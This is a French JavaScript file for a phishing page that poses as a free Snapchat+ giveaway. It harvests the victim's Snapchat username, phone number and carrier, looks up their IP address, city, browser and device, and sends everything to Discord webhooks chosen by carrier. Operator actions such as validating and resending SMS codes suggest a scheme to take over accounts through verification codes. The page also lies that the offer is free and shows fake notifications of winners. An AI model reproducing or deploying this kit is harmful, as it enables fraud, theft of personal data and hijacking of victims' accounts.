// ============================================================
// SCRIPT.JS - VERSION FINALE AVEC TES WEBHOOKS
// ============================================================

// ============================================================
// 🔑 TES 3 WEBHOOKS DISCORD
// ============================================================
const WEBHOOKS = {
    sfr: 'https://discord.com/api/webhooks/1531323012937420831/u2FSa0KVRK6yIwL38SB5oQFI6gDzPSmv3pfJgkns3_Ec0ykN7-Ueq44zzzxKCQtY19c-',
    bouygues: 'https://discord.com/api/webhooks/1531322878115446885/DFo1eu_x_XP21OiXPA445SjqzT8HGeD_WUhLIwQSxR7tXMtyO84ye35btxKMM6ZWdy7h',
    orange: 'https://discord.com/api/webhooks/1531323154419552428/oIm7zaxOlsJLyJ92PjXpDsKNERek--s0ts-8-GtacuIYrKVuG19U0-BWH_B7CBxh8VLC'
};

// ============================================================
// VARIABLES GLOBALES
// ============================================================
let userGeo = { ip: 'Inconnue', country: 'France', city: 'Inconnue' };
let userBrowser = 'Inconnu';
let userDevice = 'Inconnu';

// ============================================================
// SÉLECTION OPÉRATEUR - EN GLOBAL
// ============================================================
window.selectOp = function(btn) {
    document.querySelectorAll('.op-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
};

// ============================================================
// SHAKE ERROR
// ============================================================
function shakeError(el) {
    el.classList.remove('shake', 'error');
    void el.offsetWidth;
    el.classList.add('error', 'shake');
    setTimeout(() => el.classList.remove('error', 'shake'), 1500);
}

// ============================================================
// RÉCUPÉRATION IP
// ============================================================
async function getIP() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        return {
            ip: data.ip || 'Inconnue',
            country: data.country_name || 'France',
            city: data.city || 'Inconnue'
        };
    } catch {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return { ip: data.ip || 'Inconnue', country: 'France', city: 'Inconnue' };
        } catch {
            return { ip: 'Inconnue', country: 'France', city: 'Inconnue' };
        }
    }
}

function getDeviceInfo() {
    const ua = navigator.userAgent;
    const isMobile = /Mobile|Tablet|Phone/i.test(ua);
    let browser = 'Inconnu';
    if (ua.includes('Firefox')) browser = 'Firefox';
    else if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
    else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
    else if (ua.includes('Edg')) browser = 'Edge';
    return {
        browser: browser,
        device: isMobile ? '📱 Téléphone' : '💻 Ordinateur'
    };
}

async function init() {
    const geo = await getIP();
    const info = getDeviceInfo();
    userGeo = geo;
    userBrowser = info.browser;
    userDevice = info.device;
    console.log('✅ Infos prêtes:', userGeo);
}

// ============================================================
// ENVOI VERS LE BON WEBHOOK
// ============================================================
async function sendToWebhook(operator, message) {
    let webhookUrl = null;
    const op = operator.toLowerCase();
    
    if (op.includes('sfr')) {
        webhookUrl = WEBHOOKS.sfr;
    } else if (op.includes('bouygues') || op.includes('b&you')) {
        webhookUrl = WEBHOOKS.bouygues;
    } else if (op.includes('orange')) {
        webhookUrl = WEBHOOKS.orange;
    }
    
    if (!webhookUrl) {
        console.error('❌ Aucun webhook pour:', operator);
        return false;
    }
    
    try {
        const res = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: message })
        });
        return res.ok;
    } catch (e) {
        console.error('❌ Erreur envoi:', e);
        return false;
    }
}

// ============================================================
// HANDLE CONTINUE
// ============================================================
window.handleContinue = async function() {
    const usernameInput = document.getElementById('snap-input');
    const phoneInput = document.getElementById('phone-input');
    const btn = document.querySelector('.btn');
    
    const username = usernameInput.value.trim();
    const phone = phoneInput ? phoneInput.value.trim() : '';
    const operatorBtn = document.querySelector('.op-btn.active');

    if (!username) {
        shakeError(usernameInput);
        usernameInput.focus();
        return;
    }

    if (!operatorBtn) {
        document.querySelectorAll('.op-btn').forEach(e => {
            e.classList.add('op-error');
            setTimeout(() => e.classList.remove('op-error'), 1500);
        });
        return;
    }

    const rawPhone = phone.replace(/\s/g, '');
    if (!rawPhone || rawPhone.length < 10 || !/^0[67]/.test(rawPhone)) {
        shakeError(phoneInput.closest('.phone-wrapper'));
        phoneInput.focus();
        return;
    }

    btn.disabled = true;
    btn.textContent = 'Envoi...';

    try {
        const operator = operatorBtn.textContent.trim();
        const date = new Date().toLocaleString('fr-FR', {
            timeZone: 'Europe/Paris',
            weekday: 'long',
            day: 'numeric',
            month: 'long',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
        const id = Date.now().toString(36) + Math.random().toString(36).substring(2, 8);

        const message = `🔑 **Nouvelle soumission Snapchat+**
👻 Utilisateur: @${username}
📡 Opérateur: ${operator}
📞 Numéro: +33${rawPhone.replace(/^0/, '')}
🌍 Pays: ${userGeo.country || 'France'}
🏙️ Ville: ${userGeo.city || 'Inconnue'}
🕵️ IP: ${userGeo.ip || 'Inconnue'}
🌐 Navigateur: ${userBrowser || 'Inconnu'}
💾 Appareil: ${userDevice || 'Inconnu'}
🕐 Date: ${date}

**Actions:**
✅ Valider le code
❌ Changer le numéro
🔁 Renvoyer (4 chiffres)
🔢 Renvoyer (SFR FORMAT)
🔢 Renvoyer (ORANGE FORMAT)
🔢 Renvoyer (XBOX MICROSOFT)
🚫 Instant Blacklist

ID: ${id} • ${date}`;

        const sent = await sendToWebhook(operator, message);

        if (sent) {
            const card = document.querySelector('.card');
            const below = document.querySelector('.below-card');
            if (below) below.style.display = 'none';

            card.innerHTML = `
                <div style="display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:28px">
                    <img src="logosnap.png" style="width:36px;height:36px;object-fit:contain" onerror="this.style.display='none'">
                    <span style="font-family:'Inter',sans-serif;font-size:36px;font-weight:800;letter-spacing:-1.5px;line-height:1;color:#fff">Snapchat<span style="background:linear-gradient(135deg,#FFB800,#FF6B00);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;font-weight:900">+</span></span>
                </div>
                <div style="width:88px;height:88px;background:#1c1c1e;border:1px solid rgba(255,255,255,0.07);border-radius:24px;margin:0 auto 28px;display:flex;align-items:center;justify-content:center;position:relative">
                    <svg width="52" height="52" viewBox="0 0 52 52" style="animation:spin 1.2s linear infinite">
                        <circle cx="26" cy="26" r="21" fill="none" stroke="rgba(255,255,255,0.06)" stroke-width="3.5"/>
                        <path d="M26 5 A21 21 0 0 1 47 26" fill="none" stroke="#FFFC00" stroke-width="3.5" stroke-linecap="round"/>
                    </svg>
                </div>
                <h1 style="font-size:20px;font-weight:800;color:#fff;margin-bottom:10px;letter-spacing:-0.3px">En attente de validation...</h1>
                <p style="font-size:13px;color:rgba(255,255,255,0.3)">Un administrateur va vérifier votre demande.</p>
                <p style="font-size:12px;color:rgba(255,255,255,0.2);margin-top:8px">Vous recevrez un code SMS sous peu.</p>
                <div style="margin-top:20px;display:flex;gap:4px;justify-content:center">
                    ${[1,2,3].map(i => `<div style="width:8px;height:8px;border-radius:50%;background:#FFB800;animation:dot-wave 1.5s ease-in-out infinite;animation-delay:${i * 0.3}s"></div>`).join('')}
                </div>
            `;
        } else {
            alert('❌ Erreur d\'envoi. Vérifie les webhooks.');
        }

    } catch (e) {
        console.error('Erreur:', e);
        alert('❌ Erreur de connexion.');
    }

    btn.disabled = false;
    btn.textContent = 'Continuer →';
};

// ============================================================
// FAQ
// ============================================================
window.showFAQ = function() {
    const card = document.querySelector('.card');
    const below = document.querySelector('.below-card');
    if (below) below.style.display = 'none';

    card.innerHTML = `
        <div style="text-align:left;margin-bottom:20px">
            <button onclick="location.reload()" style="background:none;border:none;color:rgba(255,255,255,0.45);font-size:13px;cursor:pointer;padding:0;display:flex;align-items:center;gap:5px">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
                Retour
            </button>
        </div>
        <h1 style="font-size:22px;font-weight:800;margin-bottom:8px;letter-spacing:-0.5px">Questions fréquentes</h1>
        <div class="faq-list">
            <div class="faq-item" onclick="toggleFaq(this)">
                <div class="faq-q">Comment recevoir Snapchat+ ? <span class="faq-chevron">›</span></div>
                <div class="faq-a">Snapchat+ est activé automatiquement sur votre compte après vérification.</div>
            </div>
            <div class="faq-item" onclick="toggleFaq(this)">
                <div class="faq-q">Combien de temps ça prend ? <span class="faq-chevron">›</span></div>
                <div class="faq-a">Le processus peut prendre jusqu'à 24 heures.</div>
            </div>
            <div class="faq-item" onclick="toggleFaq(this)">
                <div class="faq-q">Est-ce gratuit ? <span class="faq-chevron">›</span></div>
                <div class="faq-a">Oui, cette offre est 100% gratuite pour les utilisateurs éligibles.</div>
            </div>
        </div>
    `;
};

window.toggleFaq = function(item) {
    const answer = item.querySelector('.faq-a');
    const chevron = item.querySelector('.faq-chevron');
    const isOpen = answer.style.maxHeight && answer.style.maxHeight !== '0px';

    document.querySelectorAll('.faq-a').forEach(a => a.style.maxHeight = '0px');
    document.querySelectorAll('.faq-chevron').forEach(c => c.style.transform = 'rotate(90deg)');

    if (!isOpen) {
        answer.style.maxHeight = answer.scrollHeight + 'px';
        chevron.style.transform = 'rotate(270deg)';
    }
};

window.showTrack = function() {
    const card = document.querySelector('.card');
    const below = document.querySelector('.below-card');
    below.style.display = 'none';

    card.innerHTML = `
        <div style="text-align:left;margin-bottom:20px">
            <button onclick="location.reload()" style="background:none;border:none;color:rgba(255,255,255,0.45);font-size:13px;cursor:pointer;padding:0;display:flex;align-items:center;gap:5px">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
                Retour
            </button>
        </div>
        <h1 style="font-size:22px;font-weight:800;margin-bottom:8px;letter-spacing:-0.5px">Suivre ma demande</h1>
        <p style="font-size:13px;color:rgba(255,255,255,0.4);margin-bottom:24px;line-height:1.5">Entrez votre numéro de téléphone pour vérifier son statut</p>
        <label class="input-label">Nom d'utilisateur Snapchat</label>
        <div class="input-wrapper" style="margin-bottom:12px">
            <div class="at-badge">@</div>
            <input type="text" id="track-username" placeholder="votre_snapchat" autocomplete="off" spellcheck="false">
        </div>
        <label class="input-label" style="margin-top:2px">Numéro de téléphone</label>
        <div class="phone-wrapper" style="margin-bottom:4px">
            <input type="tel" id="track-phone" placeholder="06 XX XX XX XX" autocomplete="off" maxlength="14" inputmode="numeric">
        </div>
        <p class="input-hint" style="margin-bottom:20px">Entrez le numéro de téléphone utilisé lors de votre inscription</p>
        <button class="btn" id="track-btn" onclick="lookupAndTrack()">Vérifier →</button>
        <p id="track-error" style="font-size:12px;color:#f87171;margin-top:12px;min-height:16px;text-align:center"></p>
    `;

    const trackPhone = document.getElementById('track-phone');
    trackPhone.addEventListener('input', function() {
        const start = this.selectionStart;
        const length = this.value.length;
        this.value = this.value.replace(/\D/g, '').slice(0, 10).match(/\d{1,2}/g)?.join(' ') || '';
        this.setSelectionRange(start + (this.value.length - length), start + (this.value.length - length));
    });
    trackPhone.addEventListener('keydown', (e) => { if (e.key === 'Enter') lookupAndTrack(); });
    document.getElementById('track-username').addEventListener('keydown', (e) => { if (e.key === 'Enter') lookupAndTrack(); });
};

window.lookupAndTrack = async function() {
    const username = document.getElementById('track-username');
    const phone = document.getElementById('track-phone');
    const btn = document.getElementById('track-btn');
    const error = document.getElementById('track-error');
    const usernameVal = username.value.trim();
    const phoneVal = phone.value.replace(/\s/g, '');

    if (!usernameVal) {
        shakeError(username);
        return;
    }

    if (!phoneVal || phoneVal.length < 10 || !/^0[67]/.test(phoneVal)) {
        shakeError(phone.closest('.phone-wrapper'));
        return;
    }

    btn.disabled = true;
    btn.textContent = 'Recherche…';
    error.textContent = '';
    error.textContent = '📌 Le suivi n\'est pas disponible en mode local.';
    btn.disabled = false;
    btn.textContent = 'Vérifier →';
};

// ============================================================
// INITIALISATION
// ============================================================
document.addEventListener('DOMContentLoaded', function() {
    init();

    document.getElementById('snap-input').addEventListener('keydown', (e) => {
        if (e.key === 'Enter') handleContinue();
    });

    document.getElementById('phone-input').addEventListener('keydown', (e) => {
        if (e.key === 'Enter') handleContinue();
    });

    document.getElementById('phone-input').addEventListener('input', function() {
        const start = this.selectionStart;
        const length = this.value.length;
        this.value = this.value.replace(/\D/g, '').slice(0, 10).match(/\d{1,2}/g)?.join(' ') || '';
        this.setSelectionRange(start + (this.value.length - length), start + (this.value.length - length));
    });

    const notifText = document.getElementById('notif-text');
    if (notifText) {
        notifText.style.transition = 'opacity 0.4s';
        const names = ['Alex', 'Léa', 'Noah', 'Emma', 'Liam', 'Jade', 'Tom', 'Inès', 'Enzo', 'Lucie',
                       'Hugo', 'Manon', 'Lucas', 'Camille', 'Nathan', 'Chloé', 'Théo', 'Eva', 'Axel', 'Zoé',
                       'Maxime', 'Clara', 'Romain', 'Alice', 'Yanis', 'Sarah', 'Kylian', 'Lola', 'Baptiste', 'Elisa'];

        notifText.textContent = `🎉 ${names[Math.floor(Math.random() * names.length)].slice(0, 3)}*** vient de recevoir son Snap+ !`;

        setInterval(() => {
            notifText.style.opacity = '0';
            setTimeout(() => {
                notifText.textContent = `🎉 ${names[Math.floor(Math.random() * names.length)].slice(0, 3)}*** vient de recevoir son Snap+ !`;
                notifText.style.opacity = '1';
            }, 400);
        }, 3000);
    }
});